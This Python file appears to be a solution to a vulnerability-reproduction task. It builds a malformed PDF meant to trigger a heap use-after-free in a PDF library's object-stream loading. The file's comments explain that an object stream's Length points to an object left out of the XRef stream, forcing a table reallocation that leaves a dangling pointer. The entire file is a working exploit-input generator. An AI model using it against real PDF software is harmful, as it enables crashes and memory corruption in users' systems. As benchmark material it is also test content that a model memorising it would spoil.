import struct

class Solution:
    def solve(self, src_path: str) -> bytes:
        # Construct a PDF that triggers a Heap Use-After-Free in the target library.
        # The vulnerability is triggered when loading an object stream (ObjStm).
        # We define an ObjStm (Obj 4) whose Length is an indirect reference to Obj 1000.
        # Obj 1000 exists in the file but is omitted from the XRef Stream.
        # When the library loads Obj 4 to access the compressed Obj 6 inside it,
        # it attempts to resolve the Length (1000 0 R).
        # Since 1000 is not in the XRef table (size 7), the library initiates a repair/scan.
        # The scan finds Obj 1000 and reallocates/solidifies the XRef table.
        # The original pointer to Obj 4's XRef entry (held by pdf_load_obj_stm) becomes a dangling pointer.
        # Subsequent access to this pointer causes the UAF.

        # 1. Content for the compressed object (Obj 6)
        obj6_content = b'<< /Type /Font /Subtype /Type1 /BaseFont /Helvetica >>'

        # 2. Object Stream (Obj 4) data
        # "6 0" indicates Obj 6 is at offset 0 relative to 'First'.
        # We pad the header to 10 bytes to match '/First 10'.
        stm_header = b'6 0       ' 
        stm_data = stm_header + obj6_content
        stm_len = len(stm_data)

        # 3. Object 1000: The length of Obj 4
        # This object is placed in the file but omitted from the XRef Stream.
        obj1000 = f'1000 0 obj\n{stm_len}\nendobj\n'.encode('ascii')

        # 4. Header
        header = b'%PDF-1.6\n%\xe2\xe3\xcf\xd3\n'

        # 5. Define standard objects
        
        # Obj 1: Catalog
        obj1 = b'1 0 obj\n<< /Type /Catalog /Pages 2 0 R >>\nendobj\n'

        # Obj 2: Pages
        obj2 = b'2 0 obj\n<< /Type /Pages /Kids [3 0 R] /Count 1 >>\nendobj\n'

        # Obj 3: Page
        # References Obj 6 (which is in ObjStm 4) in Resources to trigger loading chain
        obj3 = b'3 0 obj\n<< /Type /Page /Parent 2 0 R /MediaBox [0 0 600 800] /Resources << /Font << /F1 6 0 R >> >> >>\nendobj\n'

        # Obj 4: ObjStm
        # References 1000 0 R for Length to trigger resize during load
        obj4_start = b'4 0 obj\n<< /Type /ObjStm /N 1 /First 10 /Length 1000 0 R >>\nstream\n'
        obj4_end = b'\nendstream\nendobj\n'
        obj4 = obj4_start + stm_data + obj4_end

        # 6. Calculate offsets
        current_offset = len(header)
        
        off1 = current_offset
        current_offset += len(obj1)
        
        off2 = current_offset
        current_offset += len(obj2)
        
        off3 = current_offset
        current_offset += len(obj3)
        
        off4 = current_offset
        current_offset += len(obj4)
        
        off1000 = current_offset
        current_offset += len(obj1000)
        
        off5 = current_offset
        
        # 7. Obj 5: XRef Stream
        # Indexes objects 0-6. Obj 1000 is intentionally missing.
        # W [1 4 1] -> Type (1 byte), Offset (4 bytes), Gen (1 byte)
        def pack_entry(t, f2, f3):
            return struct.pack('>BIB', t, f2, f3)

        xdata = b''
        xdata += pack_entry(0, 0, 255)      # 0: Free
        xdata += pack_entry(1, off1, 0)     # 1: Catalog
        xdata += pack_entry(1, off2, 0)     # 2: Pages
        xdata += pack_entry(1, off3, 0)     # 3: Page
        xdata += pack_entry(1, off4, 0)     # 4: ObjStm
        xdata += pack_entry(1, off5, 0)     # 5: XRef Stream (points to itself)
        xdata += pack_entry(2, 4, 0)        # 6: Compressed in ObjStm 4, index 0

        # Dict for XRef Stream
        # Size 7 implies objects 0..6. Accessing 1000 triggers expansion.
        xref_dict = f'<< /Type /XRef /Size 7 /W [1 4 1] /Root 1 0 R /Length {len(xdata)} >>'.encode('ascii')
        
        obj5 = b'5 0 obj\n' + xref_dict + b'\nstream\n' + xdata + b'\nendstream\nendobj\n'

        # 8. Assemble PDF
        body = header + obj1 + obj2 + obj3 + obj4 + obj1000 + obj5
        trailer = f'startxref\n{off5}\n%%EOF\n'.encode('ascii')
        
        return body + trailer